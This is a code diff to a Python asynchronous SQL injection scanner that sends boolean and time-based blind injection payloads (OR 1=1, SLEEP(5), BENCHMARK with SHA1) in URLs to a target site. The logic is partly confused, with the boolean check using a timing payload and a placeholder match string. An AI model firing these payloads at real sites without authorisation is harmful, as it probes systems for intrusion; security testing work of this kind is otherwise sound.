@@ -1,4 +1,4 @@
-import argparse,asyncio,aiohttp
+import argparse, asyncio, aiohttp, time
 from bs4 import BeautifulSoup as BS
 
 class SQLInjectionScanner:
@@ -29,26 +29,39 @@ class SQLInjectionScanner:
         return None
 
     async def boolean_based_detection(self, database_type):
-        payload = f"{database_type}' OR 1=1 --"
-        url = f"{self.target_url}/{payload}"
-
-        async with self.session.get(url) as response:
-            data = await response.text()
-
-            if "some_unique_string_or_pattern" in data:
-                print("Boolean-Based Blind SQL Injection Detected!")
-                return True
-
-        return False
-
-    async def time_based_detection(self, database_type):
         payload = f"{database_type}' OR IF(1=1, SLEEP(5), 0) --"
         url = f"{self.target_url}/{payload}"
 
         try:
+            start_time = time.time()
             async with self.session.get(url) as response:
-                elapsed_time = response.elapsed.total_seconds()
-                if elapsed_time > 5:  
+                elapsed_time = time.time() - start_time
+
+                data = await response.text()
+
+                if "some_unique_string_or_pattern" in data:
+                    print("Boolean-Based Blind SQL Injection Detected!")
+                    return True
+
+                if elapsed_time > 5:
+                    print("Boolean-Based Blind SQL Injection Detected!")
+                    return True
+
+        except aiohttp.ClientError as e:
+            print('Error during boolean-based detection: ', e)
+
+        return False
+
+    async def time_based_detection(self, database_type):
+        payload = f"{database_type}' OR IF(1=1, BENCHMARK(5000000, SHA1('test')), 0) --"
+        url = f"{self.target_url}/{payload}"
+
+        try:
+            start_time = time.time()
+            async with self.session.get(url) as response:
+                elapsed_time = time.time() - start_time
+
+                if elapsed_time > 5:
                     print("Time-Based Blind SQL Injection Detected!")
                     return True
 
